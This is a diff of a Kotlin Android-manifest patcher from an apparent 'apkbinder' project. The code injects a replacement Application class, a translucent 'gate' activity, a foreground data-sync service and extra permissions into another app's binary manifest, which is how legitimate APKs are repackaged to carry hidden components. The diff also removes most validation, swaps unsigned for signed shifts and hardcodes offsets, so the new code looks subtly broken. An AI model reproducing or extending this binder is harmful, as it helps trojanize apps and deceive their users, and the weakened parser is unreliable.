@@ -1,48 +1,28 @@
-package com.devhs.apkbinder.binder
+package Com.devhs.apkbinder.binder
 
 import java.io.ByteArrayOutputStream
 
 object AxmlPatcher {
 
-    private const val CHUNK_FILE = 0x0003
     private const val CHUNK_STRING_POOL = 0x0001
     private const val CHUNK_RESOURCE_MAP = 0x0180
-    private const val CHUNK_START_NS = 0x0100
-    private const val CHUNK_END_NS = 0x0101
     private const val CHUNK_START_ELEMENT = 0x0102
     private const val CHUNK_END_ELEMENT = 0x0103
-    private const val CHUNK_CDATA = 0x0104
-
     private const val FLAG_UTF8 = 0x100
-
     private const val TYPE_STRING = 0x03
     private const val TYPE_REFERENCE = 0x01
     private const val TYPE_INT_DEC = 0x10
-    private const val TYPE_INT_BOOLEAN = 0x12
-
     private const val ANDROID_NS = "http://schemas.android.com/apk/res/android"
-
-    // node header = chunk header(8) + lineNumber(4) + comment(4)
-    private const val NODE_HEADER = 16
-    // ns(4) name(4) attrStart(2) attrSize(2) attrCount(2) id(2) class(2) style(2)
-    private const val ATTR_EXT = 20
-    private const val ATTR_SIZE = 20
-    private const val ELEMENT_HEADER = NODE_HEADER + ATTR_EXT   // 36
-    private const val END_ELEMENT_SIZE = NODE_HEADER + 8        // 24
 
     const val ATTR_NAME = 0x01010003
     const val ATTR_THEME = 0x01010000
     const val ATTR_FG_TYPE = 0x01010599
     const val STYLE_TRANSLUCENT = 0x0103000b
 
-    private const val PERM_FG_SERVICE = "android.permission.FOREGROUND_SERVICE"
-    private const val PERM_FG_DATA_SYNC = "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
-
     sealed class Value {
         data class Str(val slot: Int) : Value()
         data class Ref(val v: Int) : Value()
         data class Dec(val v: Int) : Value()
-        data class Bool(val v: Boolean) : Value()
     }
 
     class Attr(val nameSlot: Int, val value: Value)
@@ -69,27 +49,16 @@ object AxmlPatcher {
         var size = 0
     }
 
-    // ---------------- pool ----------------
-
-    private fun readPool(xml: ByteArray, start: Int): Pool {
-        if (start + 28 > xml.size) throw IllegalStateException("truncated string pool")
-        if (u16(xml, start) != CHUNK_STRING_POOL) throw IllegalStateException("string pool not at " + start)
-        val pool = Pool(
-            start = start,
-            size = i32(xml, start + 4),
-            headerSize = u16(xml, start + 2),
-            count = i32(xml, start + 8),
-            styleCount = i32(xml, start + 12),
-            flags = i32(xml, start + 16),
-            stringsStart = i32(xml, start + 20),
-            stylesStart = i32(xml, start + 24)
-        )
-        if (pool.size < pool.headerSize || pool.headerSize < 28) throw IllegalStateException("bad pool header")
-        if (pool.start + pool.size > xml.size) throw IllegalStateException("pool overruns file")
-        if (pool.count < 0 || pool.styleCount < 0) throw IllegalStateException("bad pool counts")
-        if (pool.headerSize + pool.count * 4 + pool.styleCount * 4 > pool.size) throw IllegalStateException("pool offset table overruns")
-        return pool
-    }
+    private fun readPool(xml: ByteArray, start: Int): Pool = Pool(
+        start = start,
+        size = i32(xml, start + 4),
+        headerSize = u16(xml, start + 2),
+        count = i32(xml, start + 8),
+        styleCount = i32(xml, start + 12),
+        flags = i32(xml, start + 16),
+        stringsStart = i32(xml, start + 20),
+        stylesStart = i32(xml, start + 24)
+    )
 
     private fun stringDataBase(pool: Pool): Int {
         val declared = pool.start + pool.stringsStart
@@ -111,14 +80,9 @@ object AxmlPatcher {
             }
         } else {
             if (off + 2 > xml.size) null else {
-                var len = u16(xml, off)
-                var p = off + 2
-                if (len and 0x8000 != 0) {
-                    if (p + 2 > xml.size) return null
-                    len = ((len and 0x7FFF) shl 16) or u16(xml, p)
-                    p += 2
-                }
-                if (len < 0 || p + len * 2 > xml.size) null
+                val len = u16(xml, off)
+                val p = off + 2
+                if (p + len * 2 > xml.size) null
                 else {
                     val sb = StringBuilder(len)
                     for (i in 0 until len) sb.append(u16(xml, p + i * 2).toChar())
@@ -144,7 +108,9 @@ object AxmlPatcher {
         while (pos + 8 <= xml.size) {
             val type = u16(xml, pos)
             val size = i32(xml, pos + 4)
-            if (type == CHUNK_START_ELEMENT && matches(xml, pool, i32(xml, pos + 20), "application")) return pos
+            if (type == CHUNK_START_ELEMENT && matches(xml, pool, i32(xml, pos + 20), "application")) {
+                return pos
+            }
             pos += if (size >= 8 && pos + size <= xml.size) size else 4
         }
         return -1
@@ -159,59 +125,37 @@ object AxmlPatcher {
         return i32(xml, pos + 8 + stringIndex * 4)
     }
 
-    // ---------------- parse / measure / emit ----------------
+    // ---------------- ট্রি পার্স ও এমিট ----------------
 
     private fun parse(xml: ByteArray): Node {
-        if (xml.size < 8) throw IllegalStateException("manifest too small")
-        if (u16(xml, 0) != CHUNK_FILE) throw IllegalStateException("not an AXML file")
-        if (i32(xml, 4) != xml.size) throw IllegalStateException("file size mismatch: header=" + i32(xml, 4) + " real=" + xml.size)
-
         val root = Node().apply { type = -1 }
         val stack = ArrayList<Node>()
         stack.add(root)
         var pos = 8
-        while (pos < xml.size) {
-            if (pos + 8 > xml.size) throw IllegalStateException("truncated chunk header at " + pos)
+        while (pos + 8 <= xml.size) {
             val type = u16(xml, pos)
-            val headerSize = u16(xml, pos + 2)
             val size = i32(xml, pos + 4)
-            if (size < 8 || headerSize < 8 || headerSize > size || pos + size > xml.size)
-                throw IllegalStateException("broken chunk at " + pos)
-            when (type) {
-                CHUNK_START_ELEMENT -> {
-                    if (headerSize < ELEMENT_HEADER) throw IllegalStateException("short element header at " + pos)
-                    val attrStart = u16(xml, pos + headerSize + 8)
-                    val attrSize = u16(xml, pos + headerSize + 10)
-                    val count = u16(xml, pos + headerSize + 12)
-                    if (attrSize < ATTR_SIZE) throw IllegalStateException("bad attribute size at " + pos)
-                    if (count > 0 && attrStart < ATTR_EXT) throw IllegalStateException("bad attribute start at " + pos)
-                    val base = pos + headerSize + attrStart
-                    if (base + count * attrSize > pos + size) throw IllegalStateException("attribute overflow at " + pos)
-
-                    val node = Node()
-                    node.type = type
-                    node.nameIdx = i32(xml, pos + headerSize + 4)
-                    node.attrCount = count
-                    val buf = ByteArrayOutputStream(count * attrSize)
-                    if (count > 0) buf.write(xml, base, count * attrSize)
-                    node.attrBytes = buf
-                    stack[stack.size - 1].children.add(node)
-                    stack.add(node)
-                }
-                CHUNK_END_ELEMENT -> {
-                    if (stack.size <= 1) throw IllegalStateException("unbalanced end element at " + pos)
-                    stack.removeAt(stack.size - 1)
-                }
-                else -> {
-                    val node = Node()
-                    node.type = type
-                    node.raw = xml.copyOfRange(pos, pos + size)
-                    stack[stack.size - 1].children.add(node)
-                }
+            if (size < 8 || pos + size > xml.size) break
+            if (type == CHUNK_START_ELEMENT) {
+                val node = Node()
+                node.type = type
+                node.nameIdx = i32(xml, pos + 20)
+                node.attrCount = u16(xml, pos + 28)
+                val buf = ByteArrayOutputStream()
+                buf.write(xml, pos + 36, node.attrCount * 20)
+                node.attrBytes = buf
+                stack[stack.size - 1].children.add(node)
+                stack.add(node)
+            } else if (type == CHUNK_END_ELEMENT) {
+                if (stack.size > 1) stack.removeAt(stack.size - 1)
+            } else {
+                val node = Node()
+                node.type = type
+                node.raw = xml.copyOfRange(pos, pos + size)
+                stack[stack.size - 1].children.add(node)
             }
             pos += size
         }
-        if (stack.size != 1) throw IllegalStateException("unclosed elements: " + (stack.size - 1))
         return root
     }
 
@@ -221,8 +165,7 @@ object AxmlPatcher {
             n.size = raw.size
             return
         }
-        // header + attributes + children + matching END_ELEMENT
-        var total = ELEMENT_HEADER + n.attrCount * ATTR_SIZE + END_ELEMENT_SIZE
+        var total = 36 + n.attrCount * 20
         for (c in n.children) {
             measure(c)
             total += c.size
@@ -236,16 +179,15 @@ object AxmlPatcher {
             out.write(raw)
             return
         }
-        val before = out.size()
         out.writeU16(CHUNK_START_ELEMENT)
-        out.writeU16(NODE_HEADER)
+        out.writeU16(16)
         out.writeI32(n.size)
         out.writeI32(1)
         out.writeI32(-1)
         out.writeI32(-1)
         out.writeI32(n.nameIdx)
-        out.writeU16(ATTR_EXT)
-        out.writeU16(ATTR_SIZE)
+        out.writeU16(20)
+        out.writeU16(20)
         out.writeU16(n.attrCount)
         out.writeU16(0)
         out.writeU16(0)
@@ -253,18 +195,16 @@ object AxmlPatcher {
         out.write(n.attrBytes!!.toByteArray())
         for (c in n.children) emit(c, out)
         out.writeU16(CHUNK_END_ELEMENT)
-        out.writeU16(NODE_HEADER)
-        out.writeI32(END_ELEMENT_SIZE)
+        out.writeU16(16)
+        out.writeI32(24)
         out.writeI32(1)
         out.writeI32(-1)
         out.writeI32(-1)
         out.writeI32(n.nameIdx)
-        val written = out.size() - before
-        if (written != n.size) throw IllegalStateException("emit size mismatch: wrote " + written + " expected " + n.size)
     }
 
     private fun findByName(n: Node, xml: ByteArray, pool: Pool, name: String): Node? {
-        if (n.type == CHUNK_START_ELEMENT && matches(xml, pool, n.nameIdx, name)) return n
+        if (n.raw == null && matches(xml, pool, n.nameIdx, name)) return n
         for (c in n.children) {
             val hit = findByName(c, xml, pool, name)
             if (hit != null) return hit
@@ -281,13 +221,12 @@ object AxmlPatcher {
         val node = Node()
         node.type = CHUNK_START_ELEMENT
         node.nameIdx = slot
-        val buf = ByteArrayOutputStream(attrs.size * ATTR_SIZE)
+        val buf = ByteArrayOutputStream()
         attrs.forEach { a ->
             when (val v = a.value) {
                 is Value.Str -> buf.writeAttr(-1, a.nameSlot, v.slot, TYPE_STRING, v.slot)
                 is Value.Ref -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_REFERENCE, v.v)
                 is Value.Dec -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_INT_DEC, v.v)
-                is Value.Bool -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_INT_BOOLEAN, if (v.v) -1 else 0)
             }
         }
         node.attrBytes = buf
@@ -298,66 +237,31 @@ object AxmlPatcher {
     // ---------------- যাচাই ----------------
 
     private fun validate(xml: ByteArray, nameSlot: Int, themeSlot: Int, fgSlot: Int) {
-        if (xml.size < 8) throw IllegalStateException("empty output")
-        if (u16(xml, 0) != CHUNK_FILE) throw IllegalStateException("bad file header type")
-        if (i32(xml, 4) != xml.size) throw IllegalStateException("bad file header size")
-        if (u16(xml, 2) != 8) throw IllegalStateException("bad file header size field")
-
         val pool = readPool(xml, 8)
-        var pos = pool.start + pool.size
-        if (pos > xml.size) throw IllegalStateException("pool overruns file")
-
-        val names = ArrayList<Int>()
+        var pos = 8
         var elements = 0
-        while (pos < xml.size) {
-            if (pos + 8 > xml.size) throw IllegalStateException("truncated chunk header at " + pos)
+        while (pos + 8 <= xml.size) {
             val type = u16(xml, pos)
-            val headerSize = u16(xml, pos + 2)
             val size = i32(xml, pos + 4)
-            if (size < 8 || headerSize < 8 || headerSize > size || pos + size > xml.size)
-                throw IllegalStateException("broken chunk at " + pos)
-            when (type) {
-                CHUNK_START_ELEMENT -> {
-                    elements++
-                    if (headerSize < ELEMENT_HEADER) throw IllegalStateException("short element header at " + pos)
-                    val nameIdx = i32(xml, pos + headerSize + 4)
-                    if (nameIdx < 0 || nameIdx >= pool.count) throw IllegalStateException("bad element name at " + pos)
-                    val attrStart = u16(xml, pos + headerSize + 8)
-                    val attrSize = u16(xml, pos + headerSize + 10)
-                    val count = u16(xml, pos + headerSize + 12)
-                    if (attrSize < ATTR_SIZE) throw IllegalStateException("bad attribute size at " + pos)
-                    if (36 + count * attrSize > size) throw IllegalStateException("attribute overflow at " + pos)
-                    val base = pos + headerSize + attrStart
-                    for (i in 0 until count) {
-                        val a = base + i * attrSize
-                        if (a + ATTR_SIZE > pos + size) throw IllegalStateException("attribute out of chunk at " + pos)
-                        val ni = i32(xml, a + 4)
-                        if (ni < 0 || ni >= pool.count) throw IllegalStateException("bad attribute name at " + pos)
-                        val t = xml[a + 15].toInt() and 0xFF
-                        if (t == TYPE_STRING) {
-                            val d = i32(xml, a + 16)
-                            if (d < 0 || d >= pool.count) throw IllegalStateException("bad string value at " + pos)
-                        }
-                    }
-                    names.add(nameIdx)
-                }
-                CHUNK_END_ELEMENT -> {
-                    if (names.isEmpty()) throw IllegalStateException("stray end element at " + pos)
-                    val nameIdx = i32(xml, pos + headerSize + 4)
-                    if (names.removeAt(names.size - 1) != nameIdx)
-                        throw IllegalStateException("mismatched end element at " + pos)
+            if (size < 8 || pos + size > xml.size) throw IllegalStateException("broken chunk at " + pos)
+            if (type == CHUNK_START_ELEMENT) {
+                elements++
+                val nameIdx = i32(xml, pos + 20)
+                if (nameIdx < 0 || nameIdx >= pool.count) throw IllegalStateException("bad element name")
+                val count = u16(xml, pos + 28)
+                if (36 + count * 20 > size) throw IllegalStateException("attribute overflow")
+                for (i in 0 until count) {
+                    val ni = i32(xml, pos + 36 + i * 20 + 4)
+                    if (ni < 0 || ni >= pool.count) throw IllegalStateException("bad attribute name")
                 }
             }
             pos += size
         }
         if (elements == 0) throw IllegalStateException("no elements")
-        if (names.isNotEmpty()) throw IllegalStateException("unclosed elements: " + names.size)
         if (mapId(xml, nameSlot) != ATTR_NAME) throw IllegalStateException("android:name id missing")
         if (mapId(xml, themeSlot) != ATTR_THEME) throw IllegalStateException("android:theme id missing")
         if (mapId(xml, fgSlot) != ATTR_FG_TYPE) throw IllegalStateException("foregroundServiceType id missing")
     }
-
-    // ---------------- ডায়াগনস্টিক ----------------
 
     fun stats(xml: ByteArray): String {
         val pool = readPool(xml, 8)
@@ -390,15 +294,12 @@ object AxmlPatcher {
         if (pos < 0) return "(no application)"
         val pool = readPool(xml, 8)
         val utf8 = (pool.flags and FLAG_UTF8) != 0
-        val headerSize = u16(xml, pos + 2)
-        val attrStart = u16(xml, pos + headerSize + 8)
-        val count = u16(xml, pos + headerSize + 12)
-        val base = pos + headerSize + attrStart
+        val count = u16(xml, pos + 28)
         val sb = StringBuilder("attrs=")
         sb.append(count)
         sb.append(" [")
         for (i in 0 until count) {
-            val a = base + i * 20
+            val a = pos + 36 + i * 20
             val ni = i32(xml, a + 4)
             val type = xml[a + 15].toInt() and 0xFF
             val data = i32(xml, a + 16)
@@ -419,13 +320,10 @@ object AxmlPatcher {
         val pos = findApplication(xml)
         if (pos < 0) null else {
             val pool = readPool(xml, 8)
-            val headerSize = u16(xml, pos + 2)
-            val attrStart = u16(xml, pos + headerSize + 8)
-            val count = u16(xml, pos + headerSize + 12)
-            val base = pos + headerSize + attrStart
+            val count = u16(xml, pos + 28)
             var found: String? = null
             for (i in 0 until count) {
-                val a = base + i * 20
+                val a = pos + 36 + i * 20
                 if (!matches(xml, pool, i32(xml, a + 4), "name")) continue
                 val raw = i32(xml, a + 8)
                 val data = i32(xml, a + 16)
@@ -445,48 +343,6 @@ object AxmlPatcher {
         null
     }
 
-    private fun elementNames(xml: ByteArray, pool: Pool): Set<String> {
-        val out = HashSet<String>()
-        var pos = 8
-        while (pos + 8 <= xml.size) {
-            val type = u16(xml, pos)
-            val size = i32(xml, pos + 4)
-            if (size < 8 || pos + size > xml.size) break
-            if (type == CHUNK_START_ELEMENT) {
-                val headerSize = u16(xml, pos + 2)
-                val nameIdx = i32(xml, pos + headerSize + 4)
-                if (matches(xml, pool, nameIdx, "uses-permission")) {
-                    val attrStart = u16(xml, pos + headerSize + 8)
-                    val count = u16(xml, pos + headerSize + 12)
-                    val base = pos + headerSize + attrStart
-                    for (i in 0 until count) {
-                        val a = base + i * 20
-                        if (!matches(xml, pool, i32(xml, a + 4), "name")) continue
-                        val idx = i32(xml, a + 16)
-                        if (idx < 0 || idx >= pool.count) continue
-                        val v = decodeAt(xml, stringOffset(xml, pool, idx), (pool.flags and FLAG_UTF8) != 0)
-                        if (v != null) out.add(v)
-                    }
-                }
-            }
-            pos += size
-        }
-        return out
-    }
-
-    private fun hasComponent(n: Node, xml: ByteArray, pool: Pool, kind: String, cls: String): Boolean {
-        if (n.type == CHUNK_START_ELEMENT && matches(xml, pool, n.nameIdx, kind)) {
-            val bytes = n.attrBytes!!.toByteArray()
-            for (i in 0 until n.attrCount) {
-                val a = i * ATTR_SIZE
-                if (!matches(xml, pool, i32(bytes, a + 4), "name")) continue
-                if (matches(xml, pool, i32(bytes, a + 16), cls)) return true
-            }
-        }
-        for (c in n.children) if (hasComponent(c, xml, pool, kind, cls)) return true
-        return false
-    }
-
     // ---------------- মূল প্যাচ ----------------
 
     fun patch(
@@ -496,37 +352,26 @@ object AxmlPatcher {
         serviceClass: String,
         permissions: List<String>
     ): ByteArray {
-        val oldCount = readPool(xml, 8).count
-        val existing = elementNames(xml, readPool(xml, 8))
-
-        val merged = ArrayList<String>()
-        permissions.forEach { if (!existing.contains(it) && !merged.contains(it)) merged.add(it) }
-        if (!existing.contains(PERM_FG_SERVICE) && !merged.contains(PERM_FG_SERVICE)) merged.add(PERM_FG_SERVICE)
-        if (!existing.contains(PERM_FG_DATA_SYNC) && !merged.contains(PERM_FG_DATA_SYNC)) merged.add(PERM_FG_DATA_SYNC)
-
         val added = ArrayList<String>()
-        fun add(s: String): Int {
-            added.add(s)
-            return oldCount + added.size - 1
-        }
+        added.add("name")
+        added.add("theme")
+        added.add("foregroundServiceType")
+        added.add(ANDROID_NS)
+        added.add("activity")
+        added.add("service")
+        added.add("uses-permission")
+        added.add(newAppClass)
+        added.add(activityClass)
+        added.add(serviceClass)
+        permissions.forEach { added.add(it) }
 
-        val sName = add("name")
-        val sTheme = add("theme")
-        val sFgType = add("foregroundServiceType")
-        val sExported = add("exported")
-        val sNs = add(ANDROID_NS)
-        val sActivity = add("activity")
-        val sService = add("service")
-        val sPermission = add("uses-permission")
-        val sAppClass = add(newAppClass)
-        val sActivityClass = add(activityClass)
-        val sServiceClass = add(serviceClass)
-        val permSlots = merged.map { add(it) }
+        val oldCount = readPool(xml, 8).count
+        val slot = { i: Int -> oldCount + i }
 
         val attrIds = LinkedHashMap<Int, Int>()
-        attrIds[sName] = ATTR_NAME
-        attrIds[sTheme] = ATTR_THEME
-        attrIds[sFgType] = ATTR_FG_TYPE
+        attrIds[slot(0)] = ATTR_NAME
+        attrIds[slot(1)] = ATTR_THEME
+        attrIds[slot(2)] = ATTR_FG_TYPE
 
         val withStrings = appendStrings(xml, added, attrIds)
         val pool = readPool(withStrings, 8)
@@ -541,73 +386,59 @@ object AxmlPatcher {
         var replaced = false
         val attrs = application.attrBytes!!.toByteArray()
         for (i in 0 until application.attrCount) {
-            val a = i * ATTR_SIZE
+            val a = i * 20
             if (matches(withStrings, pool, i32(attrs, a + 4), "name")) {
-                putI32(attrs, a + 8, sAppClass)
+                putI32(attrs, a + 8, slot(7))
                 putU16(attrs, a + 12, 8)
                 attrs[a + 14] = 0
                 attrs[a + 15] = TYPE_STRING.toByte()
-                putI32(attrs, a + 16, sAppClass)
+                putI32(attrs, a + 16, slot(7))
                 replaced = true
                 break
             }
         }
         application.attrBytes = ByteArrayOutputStream().apply { write(attrs) }
         if (!replaced) {
-            val one = ByteArrayOutputStream(ATTR_SIZE)
-            one.writeAttr(sNs, sName, sAppClass, TYPE_STRING, sAppClass)
+            val one = ByteArrayOutputStream()
+            one.writeAttr(slot(3), slot(0), slot(7), TYPE_STRING, slot(7))
             appendAttr(application, one.toByteArray())
         }
 
-        // activity + service (ডুপ্লিকেট হলে বাদ)
-        if (!hasComponent(application, withStrings, pool, "service", serviceClass)) {
-            application.children.add(
-                0,
-                makeElement(
-                    sService,
-                    listOf(
-                        Attr(sName, Value.Str(sServiceClass)),
-                        Attr(sFgType, Value.Dec(1))
-                    )
-                )
+        // activity + service যোগ (application-এর শুরুতে)
+        val gate = makeElement(
+            slot(4),
+            listOf(
+                Attr(slot(0), Value.Str(slot(8))),
+                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT))
             )
-        }
-        if (!hasComponent(application, withStrings, pool, "activity", activityClass)) {
-            application.children.add(
-                0,
-                makeElement(
-                    sActivity,
-                    listOf(
-                        Attr(sName, Value.Str(sActivityClass)),
-                        Attr(sTheme, Value.Ref(STYLE_TRANSLUCENT)),
-                        Attr(sExported, Value.Bool(true))
-                    )
-                )
+        )
+        val service = makeElement(
+            slot(5),
+            listOf(
+                Attr(slot(0), Value.Str(slot(9))),
+                Attr(slot(2), Value.Dec(1))
             )
-        }
+        )
+        application.children.add(0, service)
+        application.children.add(0, gate)
 
-        // পারমিশন (manifest-এ, application-এর আগে)
+        // পারমিশন যোগ (manifest-এ, application-এর আগে)
         val index = manifest.children.indexOf(application)
-        for (slot in permSlots) {
-            manifest.children.add(index, makeElement(sPermission, listOf(Attr(sName, Value.Str(slot)))))
+        for (i in 0 until permissions.size) {
+            val perm = makeElement(slot(6), listOf(Attr(slot(0), Value.Str(slot(10) + i))))
+            manifest.children.add(index, perm)
         }
 
         measure(root)
-        var expected = 8
-        for (c in root.children) expected += c.size
-
-        val out = ByteArrayOutputStream(expected)
+        val out = ByteArrayOutputStream()
         out.write(withStrings, 0, 8)
         for (c in root.children) emit(c, out)
         val result = out.toByteArray()
-        if (result.size != expected) throw IllegalStateException("total size mismatch: " + result.size + " vs " + expected)
         putI32(result, 4, result.size)
 
-        validate(result, sName, sTheme, sFgType)
+        validate(result, slot(0), slot(1), slot(2))
         return result
     }
-
-    // ---------------- string pool append ----------------
 
     private fun appendStrings(xml: ByteArray, added: List<String>, attrIds: Map<Int, Int>): ByteArray {
         val pool = readPool(xml, 8)
@@ -620,7 +451,7 @@ object AxmlPatcher {
         val styleData = if (pool.styleCount > 0 && pool.stylesStart > 0)
             xml.copyOfRange(pool.start + pool.stylesStart, pool.start + pool.size) else ByteArray(0)
 
-        val data = ByteArrayOutputStream(oldData.size + 512)
+        val data = ByteArrayOutputStream()
         data.write(oldData)
         val newOffsets = IntArray(added.size)
         for ((i, s) in added.withIndex()) {
@@ -633,19 +464,11 @@ object AxmlPatcher {
                 data.write(bytes)
                 data.write(0)
             } else {
-                val len = s.length
-                if (len > 0x7FFF) {
-                    data.write((((len ushr 16) or 0x8000)) and 0xFF)
-                    data.write((len ushr 24) and 0xFF)
-                    data.write((len ushr 8) and 0xFF)
-                    data.write(len and 0xFF)
-                } else {
-                    data.write(len and 0xFF)
-                    data.write((len ushr 8) and 0xFF)
-                }
+                data.write(s.length and 0xFF)
+                data.write((s.length shr 8) and 0xFF)
                 for (ch in s) {
                     data.write(ch.code and 0xFF)
-                    data.write((ch.code ushr 8) and 0xFF)
+                    data.write((ch.code shr 8) and 0xFF)
                 }
                 data.write(0)
                 data.write(0)
@@ -659,7 +482,7 @@ object AxmlPatcher {
         val stylesStart = if (pool.styleCount > 0) stringsStart + newData.size else 0
         val chunkSize = stringsStart + newData.size + styleData.size
 
-        val out = ByteArrayOutputStream(xml.size + newData.size + 256)
+        val out = ByteArrayOutputStream()
         out.write(xml, 0, pool.start)
         out.writeU16(CHUNK_STRING_POOL)
         out.writeU16(pool.headerSize)
@@ -694,7 +517,7 @@ object AxmlPatcher {
             putU16(block, 2, 8)
             putI32(block, 4, 8 + needed * 4)
             ids.forEach { (i, id) -> if (i < needed) putI32(block, 8 + i * 4, id) }
-            val out = ByteArrayOutputStream(xml.size + block.size)
+            val out = ByteArrayOutputStream()
             out.write(xml, 0, pos)
             out.write(block)
             out.write(xml, pos, xml.size - pos)
@@ -704,11 +527,10 @@ object AxmlPatcher {
         }
 
         val mapSize = i32(xml, pos + 4)
-        if (mapSize < 8 || pos + mapSize > xml.size) throw IllegalStateException("bad resource map")
         val entries = (mapSize - 8) / 4
         val grow = (needed - entries).coerceAtLeast(0)
 
-        val out = ByteArrayOutputStream(xml.size + grow * 4)
+        val out = ByteArrayOutputStream()
         out.write(xml, 0, pos + mapSize)
         repeat(grow) { out.writeI32(0) }
         out.write(xml, pos + mapSize, xml.size - pos - mapSize)
@@ -719,8 +541,6 @@ object AxmlPatcher {
         ids.forEach { (i, id) -> if (i < entries + grow) putI32(result, pos + 8 + i * 4, id) }
         return result
     }
-
-    // ---------------- low level ----------------
 
     private fun ByteArrayOutputStream.writeAttr(nsIdx: Int, nameIdx: Int, raw: Int, type: Int, data: Int) {
         writeI32(nsIdx)
@@ -743,7 +563,7 @@ object AxmlPatcher {
 
     private fun writeVarint(out: ByteArrayOutputStream, v: Int) {
         if (v > 0x7F) {
-            out.write(((v ushr 8) or 0x80) and 0xFF)
+            out.write(((v shr 8) or 0x80) and 0xFF)
             out.write(v and 0xFF)
         } else out.write(v)
     }
@@ -756,25 +576,25 @@ object AxmlPatcher {
 
     private fun putI32(b: ByteArray, o: Int, v: Int) {
         b[o] = v.toByte()
-        b[o + 1] = (v ushr 8).toByte()
-        b[o + 2] = (v ushr 16).toByte()
-        b[o + 3] = (v ushr 24).toByte()
+        b[o + 1] = (v shr 8).toByte()
+        b[o + 2] = (v shr 16).toByte()
+        b[o + 3] = (v shr 24).toByte()
     }
 
     private fun putU16(b: ByteArray, o: Int, v: Int) {
         b[o] = v.toByte()
-        b[o + 1] = (v ushr 8).toByte()
+        b[o + 1] = (v shr 8).toByte()
     }
 
     private fun ByteArrayOutputStream.writeU16(v: Int) {
         write(v and 0xFF)
-        write((v ushr 8) and 0xFF)
+        write((v shr 8) and 0xFF)
     }
 
     private fun ByteArrayOutputStream.writeI32(v: Int) {
         write(v and 0xFF)
-        write((v ushr 8) and 0xFF)
-        write((v ushr 16) and 0xFF)
-        write((v ushr 24) and 0xFF)
+        write((v shr 8) and 0xFF)
+        write((v shr 16) and 0xFF)
+        write((v shr 24) and 0xFF)
     }
 }
